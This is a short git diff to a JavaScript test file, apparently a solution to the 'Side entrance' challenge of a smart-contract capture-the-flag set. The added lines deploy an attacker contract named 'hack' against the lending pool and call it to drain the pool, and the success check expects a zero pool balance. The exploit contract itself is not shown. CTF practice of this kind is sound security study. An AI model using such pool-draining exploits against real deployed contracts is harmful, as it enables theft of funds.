@@ -25,12 +25,17 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const factory = await ethers.getContractFactory('hack');
+        const hack = await factory.deploy(this.pool.address)
+
+        await hack.hacke(ETHER_IN_POOL, {value: this.attackerInitialEthBalance})
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await ethers.provider.getBalance(this.pool.address)
+
         ).to.be.equal('0');
         
         // Not checking exactly how much is the final balance of the attacker,
